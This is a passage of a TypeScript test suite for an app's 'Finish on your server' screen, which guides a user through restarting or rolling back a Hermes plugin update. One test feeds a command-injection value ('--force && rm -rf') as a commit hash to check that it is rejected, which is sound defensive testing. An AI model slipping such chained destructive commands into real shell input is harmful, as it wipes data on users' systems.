  const previousLoadsAfterRestart: ServerCheck = { kind: 'restart_needed', health: installedAt(PREVIOUS, COMMIT), hermesVersion: '0.21.6' }
  const previousRunsButIsOld: ServerCheck = { kind: 'outdated', health: installedAt(PREVIOUS, undefined), installKind: 'git install', update: offer, hermesVersion: '0.21.6' }
  const previousWorks: ServerCheck = { kind: 'ready', health: installedAt(PREVIOUS), update: offer, hermesVersion: '0.21.6' }
  /** What a page builds after a relaunch: nothing in memory, only what the connection keeps. */
  const afterRelaunch = finishUpdateOf({ started: undefined, schemaSeen: null, last: null, restartSeen: false, wentBack: back })

  it('asks for the restart that starts the previous version while the code of the failed one still answers', () => {
    const variant = finishVariant(previousLoadsAfterRestart, null, afterRelaunch)

    expect(variant).toEqual({ kind: 'restart', after: 'go_back' })
    expect(finishView(variant, buildRecord(), previousLoadsAfterRestart)).toMatchObject({
      intro: ['The previous version is installed. Restart Hermes to start it.'],
      command: null,
      restartLines: RESTART_LINES
    })
  })

  it('says the previous version is back and the update did not start when this app needs a newer plugin, without the failed commit\'s command', () => {
    const variant = finishVariant(previousRunsButIsOld, null, afterRelaunch)

    expect(variant).toEqual({ kind: 'went_back' })
    expect(finishView(variant, buildRecord(), previousRunsButIsOld)).toEqual({
      title: 'Finish on your server',
      intro: ['The previous version is back, but this app needs a newer plugin. The update did not start on your server.', 'The guide shows what to check before you try again.'],
      command: null,
      restartLines: null,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
      status: 'Waiting for your server…',
      done: false,
      steps: null,
      primary: { label: 'Check now', action: 'check' }
    })
  })

  it('says the previous version is back and the server is ready once it works', () => {
    const variant = finishVariant(previousWorks, null, afterRelaunch)

    expect(variant).toEqual({ kind: 'went_back' })
    expect(finishView(variant, buildRecord(), previousWorks, { state: 'done' })).toMatchObject({ status: 'The previous version is back. Your server is ready.', done: true, primary: { label: 'Done', action: 'done' } })
  })

  it('reads every check as usual once the server has another commit installed', () => {
    const elsewhere = installedAt('e'.repeat(40))

    expect(finishVariant({ kind: 'outdated', health: elsewhere, installKind: 'git install', update: offer, hermesVersion: null }, null, afterRelaunch)).toEqual({ kind: 'update' })
    expect(finishVariant({ kind: 'ready', health: elsewhere, update: null, hermesVersion: null }, null, afterRelaunch)).toBeNull()
  })

  it('lets a pending setup that waits for the new code ask for its restart first', () => {
    expect(finishVariant(previousWorks, null, afterRelaunch, true)).toEqual({ kind: 'restart', after: 'go_back' })
  })

  it('records no pending setup for the build while the previous version is back, so the page does not wait for the failed update', () => {
    expect(pendingCommit(previousRunsButIsOld, buildRecord(), back)).toBeNull()
    expect(pendingCommit(previousRunsButIsOld, buildRecord(), undefined)).toBe(COMMIT)
    expect(pendingCommit({ ...previousRunsButIsOld, health: installedAt('e'.repeat(40)) }, buildRecord(), back)).toBe(COMMIT)
  })
})

describe('highestSchema: the oldest store version any health read since the update asked for', () => {
  it('keeps the highest of what the reads showed', () => {
    expect(highestSchema(null, healthWithSchema(1))).toBe(1)
    expect(highestSchema(1, healthWithSchema(3))).toBe(3)
    expect(highestSchema(3, healthWithSchema(1))).toBe(3)
  })

  it.each<[string, ServerCheck | null]>([
    ['no check', null],
    ['a check without a health read', waiting],
    ['a health read without a store', { kind: 'restart_needed', health: { ...FAKE_PLUGIN_HEALTH, store: undefined }, hermesVersion: null }]
  ])('keeps what it had for %s', (_title, check) => {
    expect(highestSchema(2, check)).toBe(2)
    expect(highestSchema(null, check)).toBeNull()
  })

  it.each<[string, ServerCheck]>([
    ['ready', ready],
    ['outdated', outdated('git install')],
    ['app_outdated', { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }]
  ])('reads the health of a %s check too', (_title, check) => {
    expect(highestSchema(null, check)).toBe(FAKE_PLUGIN_HEALTH.store?.min_schema_version)
  })
})

describe('finishUpdateOf: what the screen knows about the update', () => {
  const ranUpdate = (outcome: UpdateOutcome): LastUpdateRun => ({ outcome, goingBack: false })
  const wentBack = (outcome: UpdateOutcome): LastUpdateRun => ({ outcome, goingBack: true })
  const base = { started, schemaSeen: null, last: null, restartSeen: false, wentBack: undefined }

  it('carries the record of the update and the store version seen', () => {
    expect(finishUpdateOf({ ...base, schemaSeen: 2 })).toEqual({ started, schemaSeen: 2, wentBack: undefined, byHand: false, awaitingRestart: false })
    expect(finishUpdateOf({ ...base, started: undefined })).toEqual(NO_UPDATE)
  })

  it.each<[string, LastUpdateRun | null]>([
    ['after a relaunch, with no run in memory', null],
    ['after the going back in this session', wentBack({ kind: 'restart' })],
    ['after a later update run in this session', ranUpdate({ kind: 'failed', step: 'install', message: 'Lost it.' })]
  ])('carries what the connection keeps of a going back %s', (_title, last) => {
    const back = { to: PREVIOUS, from: COMMIT }

    expect(finishUpdateOf({ ...base, started: undefined, last, wentBack: back }).wentBack).toEqual(back)
  })

  it('takes nothing about a going back from the session alone', () => {
    expect(finishUpdateOf({ ...base, last: wentBack({ kind: 'done', setup: FAKE_SETUP }) }).wentBack).toBeUndefined()
  })

  it('says the update was left to the user only when an update run, not a going back, ended by hand', () => {
    const manual: UpdateOutcome = { kind: 'manual', failure: 'scan_blocked', detail: null }

    expect(finishUpdateOf({ ...base, last: ranUpdate(manual) }).byHand).toBe(true)
    expect(finishUpdateOf({ ...base, last: wentBack(manual) }).byHand).toBe(false)
    expect(finishUpdateOf({ ...base, last: ranUpdate({ kind: 'restart' }) }).byHand).toBe(false)
    expect(finishUpdateOf(base).byHand).toBe(false)
  })

  it('waits for the restart the update run asked for until a poll showed a sign of it', () => {
    expect(finishUpdateOf({ ...base, last: ranUpdate({ kind: 'restart' }) }).awaitingRestart).toBe(true)
    expect(finishUpdateOf({ ...base, last: ranUpdate({ kind: 'restart' }), restartSeen: true }).awaitingRestart).toBe(false)
  })

  it.each<[string, LastUpdateRun | null]>([
    ['after a relaunch, with no outcome in memory', null],
    ['when the update run ended by hand', ranUpdate({ kind: 'manual', failure: 'refused', detail: null })],
    ['when the update run failed', ranUpdate({ kind: 'failed', step: 'install', message: 'Lost it.' })],
    ['when a going back asked for the restart, which is its own', wentBack({ kind: 'restart' })]
  ])('waits for no update restart %s', (_title, last) => {
    expect(finishUpdateOf({ ...base, last }).awaitingRestart).toBe(false)
  })
})

describe('runIsGoing: a go back that has no outcome yet', () => {
  const run = (outcome: UpdateOutcome | null): UpdateRunState => ({ steps: { pause: 'done', install: 'done', start: 'failed', setup: 'pending' }, outcome })

  it('is true until the go back has an outcome', () => {
    expect(runIsGoing(null)).toBe(false)
    expect(runIsGoing(run(null))).toBe(true)
    expect(runIsGoing(run({ kind: 'restart' }))).toBe(false)
  })
})

describe('goBackTarget: what going back installs', () => {
  it('installs the commit the server had, and says it is going back', () => {
    expect(goBackTarget({ target: COMMIT, previous: PREVIOUS, previousSchema: 1 })).toEqual({ target: PREVIOUS, goingBack: true })
  })
})

describe('updateStillOpen: an update the user finishes by hand on a server that answers', () => {
  it('is true only for the update variant under a ready plugin that still has an update', () => {
    expect(updateStillOpen({ kind: 'update' }, readyWithUpdate)).toBe(true)
    expect(updateStillOpen({ kind: 'update' }, ready)).toBe(false)
    expect(updateStillOpen({ kind: 'update' }, outdated('git install'))).toBe(false)
    expect(updateStillOpen({ kind: 'restart', after: 'update' }, readyWithUpdate)).toBe(false)
    expect(updateStillOpen(null, readyWithUpdate)).toBe(false)
    expect(updateStillOpen({ kind: 'update' }, null)).toBe(false)
  })
})

describe('finishView: after the update was installed', () => {
  it('tells the user to restart Hermes to start the new version, with the restart lines and no command', () => {
    const view = finishView({ kind: 'restart', after: 'update' }, buildRecord(), restartNeeded)

    expect(view).toEqual({
      title: 'Finish on your server',
      intro: ['The update is installed. Restart Hermes to start the new version.'],
      command: null,
      restartLines: RESTART_LINES,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#restart` },
      status: 'Waiting for your server…',
      done: false,
      steps: null,
      primary: { label: 'Check now', action: 'check' }
    })
  })

  it('tells the user to restart Hermes to start the previous version once the app put it back', () => {
    const view = finishView({ kind: 'restart', after: 'go_back' }, buildRecord(), waiting)

    expect(view).toMatchObject({
      intro: ['The previous version is installed. Restart Hermes to start it.'],
      command: null,
      restartLines: RESTART_LINES,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#restart` },
      status: 'Waiting for your server…',
      primary: { label: 'Check now', action: 'check' }
    })
  })

  it('says the server is ready once the new code answered and its setup went through', () => {
    const view = finishView({ kind: 'restart', after: 'update' }, buildRecord(), ready, { state: 'done' })

    expect(view).toMatchObject({ status: 'Your server is ready.', done: true, primary: { label: 'Done', action: 'done' }, intro: [], command: null, restartLines: null })
  })
})

describe('finishView: the new version did not start', () => {
  const goBack: FinishVariant = { kind: 'not_started', previous: PREVIOUS, goBack: true }
  const stuck: FinishVariant = { kind: 'not_started', previous: PREVIOUS, goBack: false }

  it('offers to go back, and keeps the command that does it by hand below, with the restart lines', () => {
    expect(finishView(goBack, buildRecord(), waiting)).toEqual({
      title: 'Finish on your server',
      intro: ['The new version did not start.', 'To go back yourself, run this on your server, as the user that runs Hermes:'],
      command: PREVIOUS_COMMAND,
      restartLines: RESTART_LINES,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
      status: 'Waiting for your server…',
      done: false,
      steps: null,
      primary: { label: 'Go back to the previous version', action: 'go_back' }
    })
  })

  it('shows no command for a previous commit that is not a full hash', () => {
    expect(finishView({ kind: 'not_started', previous: '--force && rm -rf', goBack: true }, buildRecord(), waiting).command).toBeNull()
  })

  it('gives the command for the previous commit, not for this build', () => {
    const { command } = finishView(goBack, buildRecord(), waiting)

    expect(command).toContain(PREVIOUS)
    expect(command).not.toContain(COMMIT)
  })

  it('says why the previous version cannot be put back, and keeps the way to check and restart', () => {
    expect(finishView(stuck, buildRecord(), waiting)).toEqual({
      title: 'Finish on your server',
      intro: ['The new version did not start.', 'The update changed how Ergates keeps its data, so the previous version cannot be put back.'],
      command: null,
      restartLines: RESTART_LINES,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#restart` },
      status: 'Waiting for your server…',
      done: false,
      steps: null,
      primary: { label: 'Check now', action: 'check' }
    })
  })

  it('shows the unavailable plugin as waiting during an update, where the intro already says what happened', () => {
    expect(finishView(goBack, buildRecord(), unavailable).status).toBe('Waiting for your server…')
  })

  it('asks to sign in again as it does for any other variant', () => {
    expect(finishView(goBack, buildRecord(), 'sign_in')).toMatchObject({ primary: { label: 'Sign in again', action: 'sign_in' }, intro: [], command: null })
  })
})

describe('finishView: going back', () => {
  const goBack: FinishVariant = { kind: 'not_started', previous: PREVIOUS, goBack: true }

  function runWith(outcome: UpdateOutcome | null, statuses: Partial<Record<UpdateStep, StepStatus>> = {}): UpdateRunState {
    return { steps: { pause: 'pending', install: 'pending', start: 'pending', setup: 'pending', ...statuses }, outcome }
  }

  const STEPS = [
    { label: 'Turning the new version off', status: 'done' },
    { label: 'Installing the previous version', status: 'active' },
    { label: 'Starting it', status: 'pending' },
    { label: 'Setting up your agents', status: 'pending' }
  ]

  it('shows the four steps and nothing to tap while the run goes', () => {
    expect(finishView(goBack, buildRecord(), waiting, { state: 'pending' }, runWith(null, { pause: 'done', install: 'active' }))).toEqual({
      title: 'Finish on your server',
      intro: [],
      command: null,
      restartLines: null,
      guide: { label: 'Open the guide', url: `${SERVER_GUIDE_URL}#manual` },
      status: 'Going back to the previous version…',
      done: false,
      steps: STEPS,
      primary: null
    })
  })

  it('shows the message of a failed run in the status line, keeps the instructions, and offers to go back again', () => {
    const run = runWith({ kind: 'failed', step: 'install', message: 'Lost the connection to your server during the update.' }, { pause: 'done', install: 'failed' })

    const view = finishView(goBack, buildRecord(), waiting, { state: 'pending' }, run)

    expect(view.status).toBe('Lost the connection to your server during the update.')
    expect(view.intro).toEqual(['The new version did not start.', 'To go back yourself, run this on your server, as the user that runs Hermes:'])
    expect(view.command).toBe(PREVIOUS_COMMAND)
    expect(view.primary).toEqual({ label: 'Go back to the previous version', action: 'go_back' })
    expect(view.steps?.[1]).toEqual({ label: 'Installing the previous version', status: 'failed' })
  })

  it('shows why Hermes refused the install in the status line, with the command still below', () => {
    const run = runWith({ kind: 'manual', failure: 'refused', detail: 'Plugin blocked by policy' }, { pause: 'done', install: 'failed' })

    const view = finishView(goBack, buildRecord(), waiting, { state: 'pending' }, run)

    expect(view.status).toBe('Hermes refused the install: Plugin blocked by policy')
    expect(view.command).toBe(PREVIOUS_COMMAND)
  })

  it('keeps the steps next to the restart a finished run asks for', () => {
    const run = runWith({ kind: 'restart' }, { pause: 'done', install: 'done', start: 'pending' })

    const view = finishView({ kind: 'restart', after: 'go_back' }, buildRecord(), waiting, { state: 'pending' }, run)

    expect(view.intro).toEqual(['The previous version is installed. Restart Hermes to start it.'])
    expect(view.restartLines).toEqual(RESTART_LINES)
    expect(view.status).toBe('Waiting for your server…')
    expect(view.steps?.map(step => step.status)).toEqual(['done', 'done', 'pending', 'pending'])
  })

  it('keeps the ticks next to the ready message when going back went through', () => {
    const run = runWith({ kind: 'done', setup: FAKE_SETUP }, { pause: 'done', install: 'done', start: 'done', setup: 'done' })

    const view = finishView(goBack, buildRecord(), ready, { state: 'done' }, run)

    expect(view).toMatchObject({ status: 'Your server is ready.', done: true, primary: { label: 'Done', action: 'done' }, intro: [] })
    expect(view.steps?.map(step => step.status)).toEqual(['done', 'done', 'done', 'done'])
  })
})

describe('finishView: an update the user finishes by hand on a plugin that works', () => {
  it('keeps the update command in view although the server answers ready, and keeps waiting', () => {
    const view = finishView({ kind: 'update' }, buildRecord(), readyWithUpdate)

    expect(view).toMatchObject({ intro: [RUN_INTRO], command: UPDATE_COMMAND, restartLines: RESTART_LINES, status: 'Waiting for your server…', done: false, primary: { label: 'Check now', action: 'check' } })
  })

  it('still hides the instructions of a ready plugin that has nothing left to update', () => {
    expect(finishView({ kind: 'update' }, buildRecord(), ready)).toMatchObject({ intro: [], command: null, restartLines: null, status: 'Checking…' })
  })
})

describe('finishView: what the status line says when the plugin cannot serve the app', () => {
  it('shows the notice of an unavailable plugin instead of waiting', () => {
    expect(finishView(null, buildRecord(), unavailable).status).toBe('The Ergates plugin cannot open its data on this server: The store is busy.')
    expect(finishView({ kind: 'restart', after: null }, buildRecord(), unavailable).status).toBe('The Ergates plugin cannot open its data on this server: The store is busy.')
  })

  it('keeps waiting while an update the app installed waits for its restart, where the page already says what to do', () => {
    expect(finishView({ kind: 'restart', after: 'update' }, buildRecord(), unavailable).status).toBe('Waiting for your server…')
  })

  it('shows the notice again after the previous version was put back, where the page asks only for a restart', () => {
    const goBack: FinishVariant = { kind: 'restart', after: 'go_back' }

    expect(finishView(goBack, buildRecord(), unavailable).status).toBe('The Ergates plugin cannot open its data on this server: The store is busy.')
    expect(finishView(goBack, buildRecord(), { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }).status).toBe("This server's Ergates plugin needs a newer version of this app. Update Ergates.")
  })

  it('shows the notice of a plugin that is newer than the app instead of waiting', () => {
    expect(finishView(null, buildRecord(), { kind: 'app_outdated', health: FAKE_PLUGIN_HEALTH }).status).toBe("This server's Ergates plugin needs a newer version of this app. Update Ergates.")
  })
})
